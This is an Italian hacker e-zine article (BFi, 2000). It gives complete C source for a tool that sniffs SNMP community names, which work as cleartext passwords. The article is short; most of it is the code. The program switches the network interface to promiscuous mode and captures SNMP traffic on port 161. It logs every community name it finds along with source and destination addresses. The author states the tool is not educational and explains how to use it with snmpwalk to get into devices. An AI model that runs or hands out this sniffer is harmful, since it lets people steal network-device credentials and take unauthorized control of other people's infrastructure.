@@ -1,0 +1,177 @@
+==============================================================================
+------------[ BFi numero 8, anno 3 - 30/04/2000 - file 16 di 28 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ SNMP C0MMUNiTY NAME SNiFFER
+-----[ del0rean <del0rean@s0ftpj.org>
+
+
+Niente di speciale! :)
+Un semplicissimo snmp community name sniffer.
+Cosa e' un community name? Diciamo che e' una sorta di password (ovviamente in
+chiaro) usata dal protocollo SNMP.
+Non controlla se il community name risulta essere writable (se faccio la 
+versione con pcap giuro che aggiungo questa feature :))
+L'ho scritto perche' non ne ho trovati di simili in giro; conosco solo un 
+altro tool simile a questo (a parte i vari tcpdump), ma e' molto piu' evoluto 
+e non adatto ai miei scopi ( :-P ).
+Non sto qui a spiegare SNMP, ASN.1 e BER perche' sarebbe un discorso bello
+lungo. Il sorgente e' abbastanza commentato.
+Ovviamente setta l'interfaccia di rete in PROMISC mode, quindi ocio!
+
+Come si usa:
+
+./scns &
+
+poi passate a leggere il logfile...
+
+./snmpwalk host [community name]
+
+Scritto ascoltando:
+"All the things you could be by now if Sigmund Freud's wife was your
+mother!" C. Mingus
+"Digeridoo ( live in Cornwall 1990 )" Aphex Twin
+
+bye!
+del0rean@s0ftpj.org
+
+<-| scns.c |->
+/*
+ * s0ftpj snmp community name sniffer. 
+ * nothing special. 
+ *
+ * no(c) del0rean@s0ftpj.org 
+ * this is NOT for educational purpouse! :)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <net/if.h>
+#include <netdb.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define IF      "eth0"        /* change thiz */
+#define LOGFILE "logfile"     /* change thiz */
+#define IPHDR   sizeof(struct iphdr)
+#define UDPHDR  sizeof(struct udphdr)
+
+
+char *trip(char *bu);
+void ifsec(char *intf, int s);
+ 
+/* Welcome to a fantastic journey into an snmp packet */
+/* We will search _only_ for the community name.      */
+/* let's go! :)                                       */
+
+char *trip(char *bu)
+{ 
+  int i, ssize;
+  char *name;
+
+  i = 0;
+
+  /* Primitive ASN.1 Types Identifier in hex 
+   * OCTET STRING 04  
+   
+   * General SNMP header
+   *      SEQUENCE {
+   *              version INTEGER {version-1(0)},
+   *              community OCTET STRING,
+   *              data ANY        -- PDUs
+   *      }
+   */
+
+  while(bu[i++] != '\x04'); 
+  /* style ? uh! */
+  if(bu[i-1] == '\x04')
+  { 
+     ssize = bu[i];   
+     name = (char *)malloc(ssize);
+     strncpy(name, (char *)&bu[i+1], ssize);
+     return name; 
+  }
+  return NULL;        
+}
+
+void ifset(char *intf, int s)  /* classic routines */
+{
+  struct ifreq ifr;
+  
+  strncpy(ifr.ifr_name, IF, strlen(IF)+1);
+  if((ioctl(s, SIOCGIFFLAGS, &ifr) == -1))
+  { 
+     printf("couldn't obtain interface flags!\n");
+     exit(1);
+  }
+  ifr.ifr_flags |= IFF_PROMISC;
+  if (ioctl (s, SIOCSIFFLAGS, &ifr) == -1 )
+  {
+     printf("couldn't set promisc flag\n");
+     exit(2);
+  }
+}
+  
+
+int main()
+{
+   FILE *log;
+   int s, sl, brec, buflen;
+   struct sockaddr_in sinn;
+   struct iphdr *ip;
+   struct udphdr *udp;
+   char buf[255], *data;
+
+   printf("\n--[ www.s0ftpj.org ]----------------------|\n");
+   printf("--[ s0ftpj snmp community name sniffer ]--|\n");
+
+   signal(SIGTERM,exit); /* ciao ciao vecna!! */
+   s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+   
+   ifset(IF, s);  /* set promisc */
+   
+   log = fopen(LOGFILE, "a");
+   if(log == NULL) printf("error opening logfile\n");  
+ 
+   buflen = sizeof(buf);
+   sl = sizeof(sinn);
+
+   ip = (struct iphdr *)buf;
+   udp = (struct udphdr *)(buf+IPHDR);
+
+   while(1)
+   {
+      brec = recvfrom(s, (char *)&buf, buflen, 0, (struct sockaddr*)&sinn, &sl);
+      if((ntohs(udp->dest)) == 161)
+      {
+         if(data = (trip(&buf[IPHDR+UDPHDR])))
+         {
+            fprintf(log,"\nlook at that!\n");
+            fflush(log);
+            fprintf(log,"*source ----> [%s]\n", (char *)inet_ntoa(ip->saddr));
+            fflush(log);
+            fprintf(log,"*dest ------> [%s]\n", (char *)inet_ntoa(ip->daddr));
+            fflush(log);
+            fprintf(log,"*Name ------> [%s]\n", data);
+            fflush(log);
+         }
+      }
+   }
+   fclose(log);
+   exit(0);
+}
+<-X->
+
+
+==============================================================================
+--------------------------------[ EOF 16/28 ]---------------------------------
+==============================================================================
